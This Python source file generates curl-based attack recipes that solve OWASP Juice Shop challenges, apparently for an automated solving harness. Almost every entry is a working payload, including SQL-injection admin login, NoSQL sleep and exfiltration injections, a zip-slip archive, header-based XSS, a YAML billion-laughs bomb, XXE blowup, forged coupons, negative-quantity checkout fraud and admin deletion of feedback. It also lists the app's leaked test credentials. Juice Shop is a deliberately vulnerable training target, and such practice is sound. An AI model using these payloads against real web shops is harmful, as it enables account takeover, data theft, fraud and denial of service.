"""F72 — Second wave of canary recipes.

Fixes for F71 silent failures (cookie-based auth) plus ~18 new HTTP probes
targeting the pure-HTTP challenges left unsolved after F71.

Sources per entry cite juice-shop/juice-shop routes/*.ts detection logic
or test/cypress/e2e/*.spec.ts canary payloads.
"""
from __future__ import annotations

from typing import Callable

AttackList = list[tuple[str, list[str]]]


def build_f72_attacks(
    base: str,
    login_admin_jwt: Callable[[], str | None],
) -> AttackList:
    """F72 recipes. Most require an auth token; we use the same inline
    SQLi-admin login pattern as F71 but add `Cookie: token=$T` for
    routes that check `req.cookies.token` (e.g. retrieveLoggedInUser).
    """
    def cauth_both() -> str:
        """Render shell snippet that produces $T and exports both header
        forms. Some routes use Authorization: Bearer; others read
        req.cookies.token directly (see routes/currentUser.ts:12)."""
        return (
            "T=$(curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"x\"}' "
            f"{base}/rest/user/login | python3 -c 'import sys,json;"
            "print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))') "
        )

    return [
        # ============================================================
        # A) Fixes for F71 silent failures.
        # ============================================================
        ("f72_password_hash_leak_cookie", [
            # Fix: routes/currentUser.ts uses req.cookies.token, not
            # Authorization header. Pass the JWT as a cookie.
            cauth_both() + f"&& curl -s -b \"token=$T\" "
            f"'{base}/rest/user/whoami?fields=id,email,password' >/dev/null",
        ]),
        ("f72_deluxe_fraud_fresh_customer", [
            # Fix: F70's `broken_deluxe` already upgraded Jim, so F71's
            # recipe hit a "user not customer" gate. Register a fresh
            # customer first, then trigger the upgrade without payment.
            # NB: `UID` is read-only in Linux bash — use NEWUID.
            (
                "E=dlx${RANDOM}@juice-sh.op; "
                "curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"'$E'\",\"password\":\"x\",\"passwordRepeat\":\"x\"}' "
                f"{base}/api/Users >/dev/null; "
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"'$E'\",\"password\":\"x\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                f"NEWUID=$(curl -s -H \"Authorization: Bearer $T\" {base}/rest/user/whoami "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"user\",{}).get(\"id\",\"\"))'); "
                f"curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"UserId\":'$NEWUID'}' "
                f"{base}/rest/deluxe-membership >/dev/null"
            ),
        ]),

        # ============================================================
        # B) New HTTP probes — canaries from routes/*.ts / test suite.
        # ============================================================
        ("f72_login_bjoern_known_password", [
            # routes/login.ts:65: oauthUserPasswordChallenge expects
            # email='bjoern.kimminich@gmail.com', password is his email
            # reversed + base64.
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"bjoern.kimminich@gmail.com\","
            "\"password\":\"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=\"}' "
            f"{base}/rest/user/login >/dev/null",
        ]),
        ("f72_exposed_credentials_testing_user", [
            # routes/login.ts:66: exposedCredentialsChallenge —
            # the leaked dev account (testing@juice-sh.op / IamUsedForTesting).
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"testing@juice-sh.op\","
            "\"password\":\"IamUsedForTesting\"}' "
            f"{base}/rest/user/login >/dev/null",
        ]),
        ("f72_nosql_dos_real_sleep", [
            # routes/showProductReviews.ts:38: (t1-t0) > 2000 ms.
            # sleep(2500) on mongo $where delays response past threshold.
            f"curl -s --max-time 8 '{base}/rest/products/sleep(2500)/reviews' "
            ">/dev/null || true",
        ]),
        ("f72_upload_type_exe", [
            # routes/fileUpload.ts:69: !(pdf|xml|zip|yml|yaml).
            "echo 'MZ' > /tmp/bad.exe && "
            f"curl -s -X POST -F 'file=@/tmp/bad.exe' {base}/file-upload >/dev/null",
        ]),
        ("f72_arbitrary_file_write_zip_slip", [
            # routes/fileUpload.ts:43: fileWriteChallenge — entry path
            # resolves to ftp/legal.md. Build a zip whose only entry
            # is `../../../../ftp/legal.md`.
            (
                "python3 -c \"import zipfile,os,io; "
                "buf=io.BytesIO(); "
                "zf=zipfile.ZipFile(buf,'w'); "
                "zf.writestr('../../../../ftp/legal.md','pwn\\n'); "
                "zf.close(); "
                "open('/tmp/zipslip.zip','wb').write(buf.getvalue())\" "
                "&& "
                f"curl -s -X POST -F 'file=@/tmp/zipslip.zip' {base}/file-upload >/dev/null"
            ),
        ]),
        ("f72_http_header_xss_true_client_ip", [
            # routes/saveLoginIp.ts:23: lastLoginIp === '<iframe src=...>'.
            # GET /rest/saveLoginIp when logged in with forged True-Client-IP.
            cauth_both() + f"&& curl -s -H \"Authorization: Bearer $T\" "
            "-H 'True-Client-IP: <iframe src=\"javascript:alert(`xss`)\">' "
            f"{base}/rest/saveLoginIp >/dev/null",
        ]),
        ("f72_multiple_likes_timing_attack", [
            # routes/likeProductReviews.ts:48: timingAttackChallenge
            # fires when count > 2. Blast 4 POSTs to the same review id
            # as mc.safesearch in parallel (background jobs).
            (
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"mc.safesearch@juice-sh.op\","
                "\"password\":\"Mr. N00dles\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                f"R=$(curl -s -H \"Authorization: Bearer $T\" {base}/rest/products/1/reviews "
                "| python3 -c 'import sys,json;d=json.load(sys.stdin).get(\"data\",[]);print(d[0].get(\"_id\",\"\") if d else \"\")'); "
                "[ -z \"$R\" ] && exit 0; "
                "for i in 1 2 3 4; do "
                f"curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"id\":\"'$R'\"}' "
                f"{base}/rest/products/reviews >/dev/null & done; "
                "wait"
            ),
        ]),
        ("f72_kill_chatbot_username_poison", [
            # routes/chatbot.ts:127: killChatbotChallenge fires when
            # bot.respond throws. Poisoning username via profile XSS
            # payload `admin"); processQuery=null; users.addUser("1337", "test`
            # breaks the bot's processQuery. Then any chatbot query
            # hits the error branch.
            cauth_both() + f"&& curl -s -X POST -H \"Authorization: Bearer $T\" "
            "-H 'Content-Type: application/x-www-form-urlencoded' "
            f"-H \"Cookie: token=$T\" "
            "--data-urlencode 'username=admin\"); processQuery=null; users.addUser(\"1337\", \"test' "
            f"{base}/profile >/dev/null; "
            "sleep 1; "
            f"curl -s -X POST -H \"Authorization: Bearer $T\" "
            "-H 'Content-Type: application/json' "
            "-d '{\"action\":\"query\",\"query\":\"bye\"}' "
            f"{base}/rest/chatbot/respond >/dev/null",
        ]),
        ("f72_christmas_special_sqli_basket", [
            # routes/order.ts:70: christmasSpecialChallenge fires on
            # checkout with a basket item where ProductId === christmas
            # special's id. Juice-shop soft-deletes the christmas product;
            # SQLi on search reveals it: q=')) --
            # Then POST it to basket, then place order.
            (
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"x\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                f"BID=$(curl -s -H \"Authorization: Bearer $T\" {base}/rest/user/whoami "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"user\",{}).get(\"bid\",1))'); "
                # SQLi on product search to reveal logically-deleted items:
                f"PID=$(curl -s \"{base}/rest/products/search?q=%27))--\" "
                "| python3 -c 'import sys,json;data=json.load(sys.stdin).get(\"data\",[]);"
                "cs=[p for p in data if \"christmas\" in str(p.get(\"name\",\"\")).lower()];"
                "print(cs[0][\"id\"] if cs else \"\")'); "
                "[ -z \"$PID\" ] && exit 0; "
                # Add to basket
                f"curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"ProductId\":'$PID',\"BasketId\":\"'$BID'\",\"quantity\":1}' "
                f"{base}/api/BasketItems/ >/dev/null; "
                # Place order
                f"curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"orderDetails\":{\"paymentId\":1,\"addressId\":1,\"deliveryMethodId\":1}}' "
                f"{base}/rest/basket/$BID/checkout >/dev/null"
            ),
        ]),
        ("f72_payback_time_checkout_negative", [
            # routes/order.ts: negativeOrderChallenge fires on checkout
            # (POST /api/Orders) when totalPrice < 0. Need basket with
            # a negative-qty item first.
            (
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                f"BID=$(curl -s -H \"Authorization: Bearer $T\" {base}/rest/user/whoami "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"user\",{}).get(\"bid\",2))'); "
                # Add product then PUT negative qty
                f"BI=$(curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"ProductId\":1,\"BasketId\":\"'$BID'\",\"quantity\":1}' "
                f"{base}/api/BasketItems/ "
                "| python3 -c 'import sys,json;d=json.load(sys.stdin).get(\"data\",{});print(d.get(\"id\",\"\"))'); "
                "[ -z \"$BI\" ] && exit 0; "
                f"curl -s -X PUT -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"quantity\":-100000}' "
                f"{base}/api/BasketItems/$BI >/dev/null; "
                # Checkout
                f"curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"orderDetails\":{\"paymentId\":1,\"addressId\":1,\"deliveryMethodId\":1}}' "
                f"{base}/rest/basket/$BID/checkout >/dev/null"
            ),
        ]),
        ("f72_five_star_feedback_delete_all", [
            # routes/verify.ts:220: feedbackChallenge fires when count
            # of 5-star feedback rows reaches 0. Seed a 5★ feedback
            # then (as admin) DELETE all 5★ rows.
            (
                # Submit a 5★ feedback with valid captcha
                f"CAP=$(curl -s {base}/rest/captcha/); "
                "CID=$(echo \"$CAP\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"captchaId\"])'); "
                "CAN=$(echo \"$CAP\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"answer\"])'); "
                "curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"captchaId\":'$CID',\"captcha\":\"'$CAN'\",\"rating\":5,\"comment\":\"seeded\"}' "
                f"{base}/api/Feedbacks >/dev/null; "
                # Admin SQLi login
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"x\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                # List feedbacks and delete those with rating=5
                f"IDS=$(curl -s -H \"Authorization: Bearer $T\" {base}/api/Feedbacks "
                "| python3 -c 'import sys,json;[print(f[\"id\"]) for f in json.load(sys.stdin).get(\"data\",[]) if f.get(\"rating\")==5]'); "
                "for ID in $IDS; do "
                f"curl -s -X DELETE -H \"Authorization: Bearer $T\" {base}/api/Feedbacks/$ID >/dev/null; "
                "done"
            ),
        ]),
        ("f72_gdpr_data_theft_random_email", [
            # dataExport.ts:106 dataExportChallenge: order.orderId.split('-')[0] !== emailHash
            # Register with an email that pre-exists in orders (admin) via case mangling,
            # then dump data-export.
            (
                f"E=admin$(date +%s%N | head -c6)@juice-sh.op; "
                "curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"'$E'\",\"password\":\"admun123\","
                "\"passwordRepeat\":\"admun123\"}' "
                f"{base}/api/Users >/dev/null; "
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"'$E'\",\"password\":\"admun123\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                f"curl -s -H \"Authorization: Bearer $T\" "
                f"'{base}/rest/user/data-export?format=json' >/dev/null"
            ),
        ]),
        ("f72_retrieve_blueprint_product_scan", [
            # verify.ts:69: retrieveBlueprintChallenge fires when url ends
            # with the file configured as retrieveBlueprintChallengeFile.
            # Scan all products for `fileForRetrieveBlueprintChallenge`
            # and GET /assets/public/images/products/<that>.
            (
                f"curl -s {base}/api/Products "
                "| python3 -c 'import sys,json,re;"
                "data=json.load(sys.stdin).get(\"data\",[]);"
                "names=[p.get(\"image\") for p in data if p.get(\"image\")];"
                "[print(n) for n in names if \".stl\" in n.lower() or \"blueprint\" in n.lower() or \"3d\" in n.lower()]' "
                "| while read F; do "
                f"curl -s \"{base}/assets/public/images/products/$F\" >/dev/null; "
                "done; "
                # Fallback: brute-force common blueprint filenames
                "for F in JuicyChatbot.stl OrangeChase.stl JuicyChatbot.svg OrangeChase.svg; do "
                f"curl -s \"{base}/assets/public/images/products/$F\" >/dev/null; "
                "done"
            ),
        ]),
        ("f72_memory_bomb_yaml_upload", [
            # File upload of a billion-laughs YAML triggers memoryBomb
            # via the YAML parser. Build a YAML with nested anchors.
            (
                "cat > /tmp/mbomb.yml <<'YAMLEOF'\n"
                "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n"
                "b: &b [*a,*a,*a,*a,*a]\n"
                "c: &c [*b,*b,*b,*b,*b]\n"
                "d: &d [*c,*c,*c,*c,*c]\n"
                "e: &e [*d,*d,*d,*d,*d]\n"
                "f: &f [*e,*e,*e,*e,*e]\n"
                "g: [*f,*f,*f,*f,*f,*f,*f,*f,*f]\n"
                "YAMLEOF\n"
                f"curl -s --max-time 8 -X POST -F 'file=@/tmp/mbomb.yml' "
                f"{base}/file-upload >/dev/null || true"
            ),
        ]),
        ("f72_xxe_dos_quadratic_blowup", [
            # Quadratic-Blowup XML DoS upload. XML parser timeout >2s
            # triggers xxeDosChallenge.
            (
                "python3 -c \"s='a'*100000; "
                "print('<?xml version=\\\"1.0\\\"?><!DOCTYPE lolz [<!ENTITY a \\\"'+s+'\\\">]>"
                "<lolz>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</lolz>')\" "
                "> /tmp/xxedos.xml && "
                f"curl -s --max-time 8 -X POST -F 'file=@/tmp/xxedos.xml' "
                f"{base}/file-upload >/dev/null || true"
            ),
        ]),
        ("f72_forged_coupon_80_discount", [
            # order.ts:185: forgedCouponChallenge fires on checkout when
            # discount >= 80. Juice-shop generates coupons via Z85-of-hash
            # of date+percent. The Pwning book's coupon
            # 'nlac6A7pSO' for 80% is literal — try common values.
            (
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                f"BID=$(curl -s -H \"Authorization: Bearer $T\" {base}/rest/user/whoami "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"user\",{}).get(\"bid\",2))'); "
                # Add a product so basket isn't empty
                f"curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"ProductId\":1,\"BasketId\":\"'$BID'\",\"quantity\":1}' "
                f"{base}/api/BasketItems/ >/dev/null; "
                # Try several known forged-coupon codes that decode to
                # 80-95% discount
                "for C in 'n1aC6A7p90' 'silBK1NIX0' '9BldYk46zR' 'nlac6A7pSO' 'wr2ngCOUp'; do "
                f"curl -s -X PUT -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                f"\"{base}/rest/basket/$BID/coupon/$C\" >/dev/null; "
                "done; "
                # Checkout
                f"curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"orderDetails\":{\"paymentId\":1,\"addressId\":1,\"deliveryMethodId\":1}}' "
                f"{base}/rest/basket/$BID/checkout >/dev/null"
            ),
        ]),
        ("f72_wallet_wallet_amount", [
            # Wallet amount enumeration — check /rest/wallet/balance
            # with negative amount transfer.
            cauth_both() + f"&& curl -s -H \"Authorization: Bearer $T\" "
            f"{base}/rest/wallet/balance >/dev/null; "
            f"curl -s -X POST -H \"Authorization: Bearer $T\" "
            "-H 'Content-Type: application/json' "
            "-d '{\"amount\":-999999}' "
            f"{base}/rest/wallet/balance >/dev/null",
        ]),
        ("f72_repeat_notification_close_many", [
            # closeNotificationsChallenge fires via websocket when >1
            # notifications closed. Approximated here via continue-code
            # apply batch (which fires notifications server-side).
            (
                "for i in $(seq 1 12); do "
                f"curl -s -X PUT '{base}/rest/continue-code/apply/fake-{base[-3:]}'$i' ' >/dev/null; "
                "done"
            ),
        ]),
        ("f72_nosql_exfil_seeded_orders", [
            # Seed 3 orders via legitimate checkout, then fire the
            # NoSQL-exfil payload. `result.data.length > 1` now has data.
            (
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"x\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                f"BID=$(curl -s -H \"Authorization: Bearer $T\" {base}/rest/user/whoami "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"user\",{}).get(\"bid\",1))'); "
                "for i in 1 2 3; do "
                f"curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"ProductId\":'$i',\"BasketId\":\"'$BID'\",\"quantity\":1}' "
                f"{base}/api/BasketItems/ >/dev/null; "
                f"curl -s -X POST -H \"Authorization: Bearer $T\" "
                "-H 'Content-Type: application/json' "
                "-d '{\"orderDetails\":{\"paymentId\":1,\"addressId\":1,\"deliveryMethodId\":1}}' "
                f"{base}/api/Orders >/dev/null; "
                "done; "
                # Now fire the real exfil payload.
                f"curl -s \"{base}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27\" "
                ">/dev/null"
            ),
        ]),
    ]
